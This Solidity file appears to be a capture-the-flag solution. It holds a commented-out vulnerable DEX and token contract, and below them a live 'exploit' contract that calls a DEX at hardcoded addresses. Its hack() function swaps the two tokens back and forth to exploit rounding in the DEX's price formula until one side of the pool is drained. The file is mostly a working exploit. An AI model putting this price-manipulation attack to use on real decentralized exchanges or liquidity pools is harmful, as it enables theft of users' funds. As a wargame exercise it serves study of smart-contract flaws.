// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/IERC20.sol";
// import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol";
// import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable.sol';

// contract Dex is Ownable {
//   address public token1;
//   address public token2;
//   constructor() {}

//   function setTokens(address _token1, address _token2) public onlyOwner {
//     token1 = _token1;
//     token2 = _token2;
//   }
  
//   function addLiquidity(address token_address, uint amount) public onlyOwner {
//     IERC20(token_address).transferFrom(msg.sender, address(this), amount);
//   }
  
//   function swap(address from, address to, uint amount) public {
//     require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
//     require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
//     uint swapAmount = getSwapPrice(from, to, amount);
//     IERC20(from).transferFrom(msg.sender, address(this), amount);
//     IERC20(to).approve(address(this), swapAmount);
//     IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
//   }

//   function getSwapPrice(address from, address to, uint amount) public view returns(uint){
//     return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
//   }

//   function approve(address spender, uint amount) public {
//     SwappableToken(token1).approve(msg.sender, spender, amount);
//     SwappableToken(token2).approve(msg.sender, spender, amount);
//   }

//   function balanceOf(address token, address account) public view returns (uint){
//     return IERC20(token).balanceOf(account);
//   }
// }


// contract SwappableToken is ERC20 {
//   address private _dex;
//   constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) {
//         _mint(msg.sender, initialSupply);
//         _dex = dexInstance;
//   }

//   function approve(address owner, address spender, uint256 amount) public {
//     // require(owner != _dex, "InvalidApprover");
//     super._approve(spender, owner, amount);
//   }
// }

interface IDex {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function getSwapPrice(address from, address to, uint256 amount) external view returns (uint256);
    function swap(address from, address to, uint256 amount) external;
}

interface IERC {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract exploit{
  IDex contractt = IDex(0xA64eCEd700Ed42dea2A45CF3cB51775B55D48f3a);
  IERC token1 = IERC(0x10b6a4e8ceCFF3b4D5857d60c8C515BdAb65E5be);
  IERC token2 = IERC(0x1cd5e88AF4285B1c3D7c46762a246af654C6Bef8);
  function transferfunds() external{
    token1.transferFrom(msg.sender, address(this),10);
    // token2.transferFrom(msg.sender,address(this),10);
  }
  function transferfunds2() external{
    token2.transferFrom(msg.sender,address(this),10);
  }
  function approve() external{
    token1.approve(address(contractt), 2 ** 256 -1);
    token2.approve(address(contractt), 2 ** 256 -1);
  }

  function hack() external {
    contractt.swap(address(token1), address(token2), token1.balanceOf(address(this)));
    contractt.swap(address(token2), address(token1), token2.balanceOf(address(this)));
    contractt.swap(address(token1), address(token2), token1.balanceOf(address(this)));
    contractt.swap(address(token2), address(token1), token2.balanceOf(address(this)));
    contractt.swap(address(token1), address(token2), token1.balanceOf(address(this)));
    contractt.swap(address(token2), address(token1), 45);
  }
}